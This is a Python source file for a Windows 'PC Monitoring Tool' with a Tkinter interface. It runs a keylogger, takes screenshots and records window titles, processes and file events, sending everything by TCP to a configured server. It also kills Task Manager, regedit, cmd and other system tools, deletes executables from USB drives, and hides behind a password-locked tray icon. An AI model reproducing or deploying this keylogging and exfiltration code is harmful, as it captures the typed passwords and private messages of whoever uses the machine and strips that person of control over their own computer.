import tkinter as tk
from tkinter import ttk, messagebox, font
import threading
import socket
import psutil
import pygetwindow as gw
from datetime import datetime
import time
from pynput.keyboard import Listener
from PIL import ImageGrab, Image
import io
import os
import subprocess
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import pystray
import sys
import json
import win32api

# Default configuration
DEFAULT_CONFIG = {
    "SERVER_HOST": "192.168.0.1",
    "SERVER_PORT": 12345,
    "PASSWORD": "",
    "FIRST_TIME": True
}

# File path for configuration
CONFIG_FILE = "config.json"

# Load configuration
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            config = json.load(f)
            for key, value in DEFAULT_CONFIG.items():
                if key not in config:
                    config[key] = value
            return config
    return DEFAULT_CONFIG

# Save configuration
def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

# Load the configuration
config = load_config()
SERVER_HOST = config["SERVER_HOST"]
SERVER_PORT = config["SERVER_PORT"]
PASSWORD = config["PASSWORD"]
FIRST_TIME = config["FIRST_TIME"]

# Suspicious processes and files
SUSPICIOUS_PROCESSES = [
    "taskmgr.exe", "msconfig.exe", "regedit.exe", "control.exe","cmd.exe",
    "SystemSettings.exe", "notepad.exe", "mspaint.exe", "calculator.exe",
    "badprocess.exe", "malware.exe", "virus.exe", "unwanted_program.exe"
]
SUSPICIOUS_FILE_EXTENSIONS = [".exe", ".bat", ".vbs", ".scr", ".js", ".msi"]

stop_event = threading.Event()
start_time = None
timer_running = False
keylogger_listener = None
tray_icon = None

def send_data(data_type, data):
    """Send data to the Admin server with retry mechanism."""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                if isinstance(data, bytes):
                    header = f"{data_type}:{len(data)}\n".encode('utf-8')
                    client_socket.sendall(header + data)
                else:
                    data_bytes = data.encode('utf-8')
                    header = f"{data_type}:{len(data_bytes)}\n".encode('utf-8')
                    client_socket.sendall(header + data_bytes)
            print(f"Sent {data_type} successfully")
            break
        except Exception as e:
            print(f"Error sending {data_type} (attempt {attempt + 1}/{max_retries}): {e}")
            if attempt < max_retries - 1:
                time.sleep(2)
            else:
                print(f"Failed to send {data_type} after {max_retries} attempts")

def log_active_processes(stop_event):
    while not stop_event.is_set():
        try:
            processes = [f"[PID: {proc.info['pid']}] {proc.info['name']}" for proc in
                         psutil.process_iter(attrs=['pid', 'name'])]
            send_data("processes", "\n".join(processes))
            time.sleep(10)
        except Exception as e:
            print(f"Error logging processes: {e}")

def log_active_window(stop_event):
    last_logged_window = None
    while not stop_event.is_set():
        try:
            active_window = gw.getActiveWindow()
            if active_window and active_window.title.strip():
                window_title = active_window.title.strip()
                if window_title != last_logged_window:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    send_data("active_window", f"{timestamp} - {window_title}")
                    last_logged_window = window_title
            time.sleep(1)
        except Exception as e:
            print(f"Error logging active window: {e}")

def monitor_suspicious_processes(stop_event):
    while not stop_event.is_set():
        try:
            suspicious_processes = []
            for proc in psutil.process_iter(attrs=['pid', 'name']):
                process_name = proc.info['name'].lower()
                if any(suspicious in process_name for suspicious in SUSPICIOUS_PROCESSES):
                    suspicious_processes.append(f"{process_name} (PID: {proc.info['pid']})")
            if suspicious_processes:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                suspicious_log = f"{timestamp} - Suspicious processes detected: {', '.join(suspicious_processes)}"
                print(suspicious_log)
                send_data("suspicious_log", suspicious_log)
            time.sleep(10)
        except Exception as e:
            print(f"Error monitoring suspicious processes: {e}")

def block_suspicious_apps(stop_event):
    while not stop_event.is_set():
        try:
            for proc in psutil.process_iter(attrs=['pid', 'name', 'exe']):
                process_name = proc.info['name'].lower()
                process_path = proc.info['exe']
                if any(suspicious in process_name for suspicious in SUSPICIOUS_PROCESSES):
                    if process_path and os.path.exists(process_path):
                        screenshot_data = capture_screenshot()
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        suspicious_log = (
                            f"{timestamp} - Suspicious app detected: {process_name} (PID: {proc.info['pid']}) at {process_path}\n"
                            f"{timestamp} - Terminating suspicious process: {process_name} (PID: {proc.info['pid']})"
                        )
                        print(suspicious_log)
                        send_data("suspicious_log", suspicious_log)
                        if screenshot_data:
                            send_data("suspicious_screenshot", screenshot_data)
                        proc.terminate()
                        print(f"Terminated suspicious process: {process_name} (PID: {proc.info['pid']})")
            time.sleep(1)
        except Exception as e:
            print(f"Error blocking suspicious apps: {e}")

def monitor_suspicious_file_creation(stop_event, directory="C:/Users/muham/Downloads"):
    class FileChangeHandler(FileSystemEventHandler):
        def on_created(self, event):
            if not event.is_directory:
                file_path = event.src_path
                file_name = os.path.basename(file_path)
                if file_name.endswith('.tmp'):
                    return
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                file_change_log = f"{timestamp} - File created: {file_name} at {file_path}"
                print(file_change_log)
                send_data("file_changes", file_change_log)
        def on_moved(self, event):
            if not event.is_directory:
                dest_path = event.dest_path
                dest_name = os.path.basename(dest_path)
                if dest_name.endswith('.tmp'):
                    return
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                file_change_log = f"{timestamp} - File renamed: {dest_name} at {dest_path}"
                print(file_change_log)
                send_data("file_changes", file_change_log)

    event_handler = FileChangeHandler()
    observer = Observer()
    observer.schedule(event_handler, directory, recursive=False)
    observer.start()
    print(f"Started monitoring directory: {directory}")
    try:
        while not stop_event.is_set():
            time.sleep(1)
    finally:
        observer.stop()
        observer.join()

def monitor_usb_and_clean(stop_event):
    known_drives = set()
    while not stop_event.is_set():
        try:
            current_drives = set()
            for partition in psutil.disk_partitions(all=False):
                if 'removable' in partition.opts or partition.fstype in ['FAT32', 'exFAT', 'NTFS']:
                    drive = partition.device
                    if os.path.exists(drive) and not drive.startswith('C:'):
                        current_drives.add(drive)

            new_drives = current_drives - known_drives
            removed_drives = known_drives - current_drives

            if new_drives:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                for drive in new_drives:
                    try:
                        usb_name = win32api.GetVolumeInformation(drive)[0] or "Unnamed USB"
                    except Exception as e:
                        usb_name = "Unnamed USB"
                        print(f"Error getting volume name for {drive}: {e}")

                    try:
                        disk_usage = psutil.disk_usage(drive)
                        total_size_mb = disk_usage.total / (1024 * 1024)
                        usb_size = f"{total_size_mb:.2f} MB"
                    except Exception as e:
                        usb_size = "Unknown Size"
                        print(f"Error getting size for {drive}: {e}")

                    usb_log = f"{timestamp} - USB drive inserted: {drive} (Name: {usb_name}, Size: {usb_size})"
                    print(usb_log)
                    send_data("usb_log", usb_log)

                    for root, _, files in os.walk(drive):
                        for file in files:
                            if any(file.lower().endswith(ext) for ext in SUSPICIOUS_FILE_EXTENSIONS):
                                file_path = os.path.join(root, file)
                                try:
                                    os.remove(file_path)
                                    delete_log = f"{timestamp} - Deleted suspicious file: {file_path}"
                                    print(delete_log)
                                    send_data("usb_log", delete_log)
                                except Exception as e:
                                    error_log = f"{timestamp} - Error deleting {file_path}: {e}"
                                    print(error_log)
                                    send_data("usb_log", error_log)

            if removed_drives:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                usb_log = f"{timestamp} - USB drive(s) removed: {', '.join(removed_drives)}"
                print(usb_log)
                send_data("usb_log", usb_log)

            known_drives = current_drives
            time.sleep(2)
        except Exception as e:
            print(f"Error monitoring USB drives: {e}")
            send_data("usb_log", f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Error: {e}")
            time.sleep(2)

def run_antivirus_scan():
    try:
        result = subprocess.run(
            ['powershell', 'Get-MpComputerStatus | Select-Object -ExpandProperty AMRunningMode'],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        if "FullScan" not in result.stdout and "QuickScan" not in result.stdout:
            subprocess.run(
                ['powershell', 'Start-MpScan', '-ScanType', 'QuickScan'],
                check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print("Antivirus scan triggered successfully.")
        else:
            print("Antivirus scan is already in progress.")
    except subprocess.CalledProcessError as e:
        print(f"Error triggering antivirus scan: {e}")

def start_keylogger(stop_event):
    global keylogger_listener
    current_input = ""
    def on_press(key):
        nonlocal current_input
        try:
            key_str = str(key).replace("'", "")
            if key_str == "Key.space" or key_str == "Key.enter":
                if current_input.strip():
                    send_data("keylogs", current_input.strip())
                current_input = ""
            elif key_str == "Key.backspace":
                current_input = current_input[:-1]
            elif "Key" not in key_str:
                current_input += key_str
            if len(current_input) > 100:
                send_data("keylogs", current_input.strip())
                current_input = ""
        except Exception as e:
            print(f"Error logging keys: {e}")

    keylogger_listener = Listener(on_press=on_press)
    keylogger_listener.start()
    while not stop_event.is_set():
        time.sleep(1)
    keylogger_listener.stop()

def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot = screenshot.resize((800, 600))
        with io.BytesIO() as buffer:
            screenshot.save(buffer, format="PNG")
            return buffer.getvalue()
    except Exception as e:
        print(f"Error capturing screenshot: {e}")
        return None

def start_monitoring():
    global start_time, timer_running
    start_time = time.time()
    timer_running = True
    update_timer()
    threading.Thread(target=log_active_processes, args=(stop_event,), daemon=True).start()
    threading.Thread(target=log_active_window, args=(stop_event,), daemon=True).start()
    threading.Thread(target=monitor_suspicious_processes, args=(stop_event,), daemon=True).start()
    threading.Thread(target=block_suspicious_apps, args=(stop_event,), daemon=True).start()
    threading.Thread(target=monitor_suspicious_file_creation, args=(stop_event, "C:/Users/muham/Downloads"), daemon=True).start()
    threading.Thread(target=start_keylogger, args=(stop_event,), daemon=True).start()
    threading.Thread(target=monitor_usb_and_clean, args=(stop_event,), daemon=True).start()
    try:
        while not stop_event.is_set():
            run_antivirus_scan()
            time.sleep(3600)
    except Exception as e:
        print(f"Monitoring interrupted: {e}")
    finally:
        stop_event.set()

def update_timer():
    if timer_running:
        elapsed_time = time.time() - start_time
        hours, remainder = divmod(elapsed_time, 3600)
        minutes, seconds = divmod(remainder, 60)
        timer_label.config(text=f"Elapsed Time: {int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}")
        app.after(1000, update_timer)

def on_start():
    global timer_running
    stop_event.clear()
    timer_running = True
    threading.Thread(target=start_monitoring, daemon=True).start()
    messagebox.showinfo("Info", "Monitoring started.")

def on_stop():
    global timer_running
    stop_event.set()
    timer_running = False
    messagebox.showinfo("Info", "Monitoring stopped.")

def verify_password():
    global app
    result = [None]

    def submit_password():
        entered_password = password_entry.get()
        result[0] = entered_password
        dialog.destroy()

    def cancel_password():
        result[0] = None
        dialog.destroy()

    app.deiconify()
    app.update_idletasks()

    dialog = tk.Toplevel(app)
    dialog.title("Password Verification")
    dialog.geometry("300x150")
    dialog.configure(bg="#1e1e2f")
    dialog.transient(app)
    dialog.grab_set()

    tk.Label(dialog, text="Enter tray password:", font=("Segoe UI", 12), fg="#d3d3d3", bg="#1e1e2f").pack(pady=10)
    password_entry = ttk.Entry(dialog, show="*", style="TEntry")
    password_entry.pack(pady=10)
    password_entry.focus_set()

    button_frame = tk.Frame(dialog, bg="#1e1e2f")
    button_frame.pack(pady=10)

    tk.Button(button_frame, text="Submit", command=submit_password, bg="#00c4cc", fg="white", font=("Segoe UI", 10), bd=0).pack(side=tk.LEFT, padx=5)
    tk.Button(button_frame, text="Cancel", command=cancel_password, bg="#ff5555", fg="white", font=("Segoe UI", 10), bd=0).pack(side=tk.LEFT, padx=5)

    dialog.update_idletasks()
    x = app.winfo_x() + (app.winfo_width() // 2) - (dialog.winfo_width() // 2)
    y = app.winfo_y() + (app.winfo_height() // 2) - (dialog.winfo_height() // 2)
    dialog.geometry(f"+{x}+{y}")

    dialog.wait_window()

    entered_password = result[0]
    if entered_password == PASSWORD:
        return True
    elif entered_password is None:
        app.withdraw()
        return False
    else:
        messagebox.showerror("Error", "Incorrect password!")
        app.withdraw()
        return False

def minimize_to_tray():
    global tray_icon, app
    app.withdraw()

    def on_restore(icon, item):
        global tray_icon
        if verify_password():
            if tray_icon:
                tray_icon.stop()
                tray_icon = None
            app.deiconify()
            app.lift()
            app.focus_force()
            app.update_idletasks()

    def on_exit(icon, item):
        global tray_icon
        if verify_password():
            if tray_icon:
                tray_icon.stop()
                tray_icon = None
            stop_event.set()
            app.destroy()
            sys.exit()

    def run_tray():
        global tray_icon
        menu = pystray.Menu(
            pystray.MenuItem("Restore", on_restore),
            pystray.MenuItem("Exit", on_exit))
        icon_image = Image.new('RGB', (64, 64), (0, 128, 255))
        tray_icon = pystray.Icon("PC Monitoring", icon_image, "PC Monitoring", menu)
        tray_icon.run()

    if tray_icon and tray_icon.visible:
        tray_icon.stop()
    threading.Thread(target=run_tray, daemon=True).start()

def create_first_time_config_window():
    def save_first_time_config():
        global SERVER_HOST, SERVER_PORT, PASSWORD, FIRST_TIME
        config = load_config()
        config["SERVER_HOST"] = server_host_entry.get()
        try:
            config["SERVER_PORT"] = int(server_port_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid integer!")
            return
        new_password = password_entry.get()
        if not new_password:
            messagebox.showerror("Error", "Password cannot be empty!")
            return
        config["PASSWORD"] = new_password
        config["FIRST_TIME"] = False
        save_config(config)
        SERVER_HOST = config["SERVER_HOST"]
        SERVER_PORT = config["SERVER_PORT"]
        PASSWORD = config["PASSWORD"]
        FIRST_TIME = config["FIRST_TIME"]
        messagebox.showinfo("Success", "Configuration saved! The application will now start.")
        config_window.destroy()
        create_main_window()

    config_window = tk.Tk()
    config_window.title("First Time Configuration")
    config_window.geometry("400x400")
    config_window.resizable(False, False)
    # Light gray background for the window
    config_window.configure(bg="#f0f0f0")

    # Frame with a subtle border and padding
    config_frame = tk.Frame(config_window, padx=20, pady=20, bg="#ffffff", bd=1, relief="solid")
    config_frame.pack(expand=True, padx=10, pady=10)

    # Consistent font for labels
    title_font = ("Helvetica", 16, "bold")
    label_font = ("Helvetica", 12)
    note_font = ("Helvetica", 9)
    button_font = ("Helvetica", 12, "bold")

    # Title and description
    tk.Label(config_frame, text="First Time Setup", font=title_font, fg="#333333", bg="#ffffff").grid(row=0, column=0, columnspan=2, pady=10)
    tk.Label(config_frame, text="Configure the server and tray password to proceed.", font=("Helvetica", 10), fg="#666666", bg="#ffffff").grid(row=1, column=0, columnspan=2, pady=5)

    # Server Host
    tk.Label(config_frame, text="Server Host:", font=label_font, fg="#333333", bg="#ffffff").grid(row=2, column=0, pady=(10, 0), sticky="e")
    server_host_entry = tk.Entry(config_frame, font=label_font, bd=1, relief="solid", bg="#f9f9f9", fg="#333333")
    server_host_entry.insert(0, SERVER_HOST)
    server_host_entry.grid(row=2, column=1, pady=(10, 0))
    tk.Label(config_frame, text="Note: Use admin IP address", font=note_font, fg="#666666", bg="#ffffff").grid(row=3, column=0, columnspan=2, pady=(0, 10))

    # Server Port
    tk.Label(config_frame, text="Server Port:", font=label_font, fg="#333333", bg="#ffffff").grid(row=4, column=0, pady=(10, 0), sticky="e")
    server_port_entry = tk.Entry(config_frame, font=label_font, bd=1, relief="solid", bg="#f9f9f9", fg="#333333")
    server_port_entry.insert(0, str(SERVER_PORT))
    server_port_entry.grid(row=4, column=1, pady=(10, 0))
    tk.Label(config_frame, text="Note: Don't change the port if not needed", font=note_font, fg="#666666", bg="#ffffff").grid(row=5, column=0, columnspan=2, pady=(0, 10))

    # Tray Password (field is empty by default)
    tk.Label(config_frame, text="Tray Password:", font=label_font, fg="#333333", bg="#ffffff").grid(row=6, column=0, pady=10, sticky="e")
    password_entry = tk.Entry(config_frame, font=label_font, show="*", bd=1, relief="solid", bg="#f9f9f9", fg="#333333")
    # Removed the line that pre-fills the password field
    # password_entry.insert(0, PASSWORD)  # This line is removed to keep the field empty
    password_entry.grid(row=6, column=1, pady=10)

    # Save Button with blue color matching the theme
    save_button = tk.Button(config_frame, text="Save & Proceed", command=save_first_time_config, font=button_font,
                            bg="#00c4cc", fg="white", bd=0, relief="flat", padx=20, pady=10,
                            activebackground="#00a3a8", activeforeground="white")
    save_button.grid(row=7, column=0, columnspan=2, pady=20)

    config_window.mainloop()

def create_config_window():
    def save_configuration():
        global SERVER_HOST, SERVER_PORT
        config = load_config()
        config["SERVER_HOST"] = server_host_entry.get()
        try:
            config["SERVER_PORT"] = int(server_port_entry.get())
            save_config(config)
            SERVER_HOST = config["SERVER_HOST"]
            SERVER_PORT = config["SERVER_PORT"]
            messagebox.showinfo("Success", "Server configuration saved successfully!")
            config_window.destroy()
        except ValueError:
            messagebox.showerror("Error", "Port must be a valid integer!")

    config_window = tk.Toplevel(app)
    config_window.title("Server Configuration")
    config_window.geometry("400x350")  # Increased height to accommodate notes
    config_window.configure(bg="#1e1e2f")

    config_frame = ttk.Frame(config_window, padding=20, style="Config.TFrame")
    config_frame.pack(expand=True)

    tk.Label(config_frame, text="Server Configuration", font=("Segoe UI", 16, "bold"), fg="#ffffff", bg="#1e1e2f").grid(row=0, column=0, columnspan=2, pady=10)

    tk.Label(config_frame, text="Server Host:", font=("Segoe UI", 12), fg="#d3d3d3", bg="#1e1e2f").grid(row=1, column=0, pady=(10, 0), sticky="e")
    server_host_entry = ttk.Entry(config_frame, style="TEntry")
    server_host_entry.insert(0, SERVER_HOST)
    server_host_entry.grid(row=1, column=1, pady=(10, 0))
    # Added note for Server Host
    tk.Label(config_frame, text="Note: Use admin IP address", font=("Segoe UI", 9), fg="#d3d3d3", bg="#1e1e2f").grid(row=2, column=0, columnspan=2, pady=(0, 10))

    tk.Label(config_frame, text="Server Port:", font=("Segoe UI", 12), fg="#d3d3d3", bg="#1e1e2f").grid(row=3, column=0, pady=(10, 0), sticky="e")
    server_port_entry = ttk.Entry(config_frame, style="TEntry")
    server_port_entry.insert(0, str(SERVER_PORT))
    server_port_entry.grid(row=3, column=1, pady=(10, 0))
    # Added note for Server Port
    tk.Label(config_frame, text="Note: Don't change the port if not needed", font=("Segoe UI", 9), fg="#d3d3d3", bg="#1e1e2f").grid(row=4, column=0, columnspan=2, pady=(0, 10))

    save_button = tk.Button(config_frame, text="Save", command=save_configuration, bg="#00c4cc", fg="white",
                            font=("Segoe UI", 12, "bold"), bd=0, padx=20, pady=10, relief="flat",
                            activebackground="#00a3a8", activeforeground="white")
    save_button.grid(row=5, column=0, columnspan=2, pady=20)

def create_password_config_window():
    def save_password():
        global PASSWORD
        new_password = password_entry.get()
        if new_password:
            config = load_config()
            config["PASSWORD"] = new_password
            save_config(config)
            PASSWORD = new_password
            messagebox.showinfo("Success", "Password updated successfully!")
            password_window.destroy()
        else:
            messagebox.showerror("Error", "Password cannot be empty!")

    password_window = tk.Toplevel(app)
    password_window.title("Configure Password")
    password_window.geometry("400x200")
    password_window.configure(bg="#1e1e2f")

    password_frame = ttk.Frame(password_window, padding=20, style="Config.TFrame")
    password_frame.pack(expand=True)

    tk.Label(password_frame, text="Configure Tray Password", font=("Segoe UI", 16, "bold"), fg="#ffffff", bg="#1e1e2f").grid(row=0, column=0, columnspan=2, pady=10)
    tk.Label(password_frame, text="New Password:", font=("Segoe UI", 12), fg="#d3d3d3", bg="#1e1e2f").grid(row=1, column=0, pady=10, sticky="e")
    password_entry = ttk.Entry(password_frame, style="TEntry", show="*")
    password_entry.insert(0, PASSWORD)
    password_entry.grid(row=1, column=1, pady=10)

    save_button = tk.Button(password_frame, text="Save", command=save_password, bg="#00c4cc", fg="white",
                            font=("Segoe UI", 12, "bold"), bd=0, padx=20, pady=10, relief="flat",
                            activebackground="#00a3a8", activeforeground="white")
    save_button.grid(row=2, column=0, columnspan=2, pady=20)

def create_main_window():
    global app, timer_label
    app = tk.Tk()
    app.title("PC Monitoring Tool")
    app.geometry("500x600")
    app.configure(bg="#1e1e2f")

    title_font = font.Font(family="Segoe UI", size=16, weight="bold")
    button_font = font.Font(family="Segoe UI", size=12, weight="bold")
    timer_font = font.Font(family="Segoe UI", size=14, weight="bold")

    style = ttk.Style()
    style.theme_use("clam")
    style.configure("TFrame", background="#1e1e2f")
    style.configure("TEntry", fieldbackground="#2d2d44", foreground="#ffffff", bordercolor="#3e3e5e", lightcolor="#3e3e5e", darkcolor="#3e3e5e")
    style.map("TEntry", fieldbackground=[("focus", "#3e3e5e")])

    header_label = tk.Label(app, text="PC Monitoring Tool", font=title_font, fg="#00c4cc", bg="#1e1e2f")
    header_label.pack(pady=20)

    timer_label = tk.Label(app, text="Elapsed Time: 00:00:00", font=timer_font, fg="#ffffff", bg="#1e1e2f")
    timer_label.pack(pady=10)

    button_frame = tk.Frame(app, bg="#1e1e2f")
    button_frame.pack(pady=20)

    def on_enter(e, btn, color):
        btn.config(bg=color)

    def on_leave(e, btn, color):
        btn.config(bg=color)

    start_button = tk.Button(button_frame, text="Start Monitoring", command=on_start, bg="#00c4cc", fg="white",
                             font=button_font, padx=20, pady=10, bd=0, relief="flat",
                             activebackground="#00a3a8", activeforeground="white")
    start_button.pack(pady=10)
    start_button.bind("<Enter>", lambda e: on_enter(e, start_button, "#00a3a8"))
    start_button.bind("<Leave>", lambda e: on_leave(e, start_button, "#00c4cc"))

    stop_button = tk.Button(button_frame, text="Stop Monitoring", command=on_stop, bg="#ff5555", fg="white",
                            font=button_font, padx=20, pady=10, bd=0, relief="flat",
                            activebackground="#cc4444", activeforeground="white")
    stop_button.pack(pady=10)
    stop_button.bind("<Enter>", lambda e: on_enter(e, stop_button, "#cc4444"))
    stop_button.bind("<Leave>", lambda e: on_leave(e, stop_button, "#ff5555"))

    minimize_button = tk.Button(button_frame, text="Minimize to Tray", command=minimize_to_tray, bg="#55aaff", fg="white",
                                font=button_font, padx=20, pady=10, bd=0, relief="flat",
                                activebackground="#4488cc", activeforeground="white")
    minimize_button.pack(pady=10)
    minimize_button.bind("<Enter>", lambda e: on_enter(e, minimize_button, "#4488cc"))
    minimize_button.bind("<Leave>", lambda e: on_leave(e, minimize_button, "#55aaff"))

    config_button = tk.Button(button_frame, text="Configure Server", command=create_config_window, bg="#ffaa00", fg="white",
                              font=button_font, padx=20, pady=10, bd=0, relief="flat",
                              activebackground="#cc8800", activeforeground="white")
    config_button.pack(pady=10)
    config_button.bind("<Enter>", lambda e: on_enter(e, config_button, "#cc8800"))
    config_button.bind("<Leave>", lambda e: on_leave(e, config_button, "#ffaa00"))

    password_button = tk.Button(button_frame, text="Configure Password", command=create_password_config_window, bg="#aa55ff", fg="white",
                                font=button_font, padx=20, pady=10, bd=0, relief="flat",
                                activebackground="#8833cc", activeforeground="white")
    password_button.pack(pady=10)
    password_button.bind("<Enter>", lambda e: on_enter(e, password_button, "#8833cc"))
    password_button.bind("<Leave>", lambda e: on_leave(e, password_button, "#aa55ff"))

    app.protocol("WM_DELETE_WINDOW", minimize_to_tray)

    app.mainloop()

if __name__ == "__main__":
    if FIRST_TIME:
        create_first_time_config_window()
    else:
        create_main_window()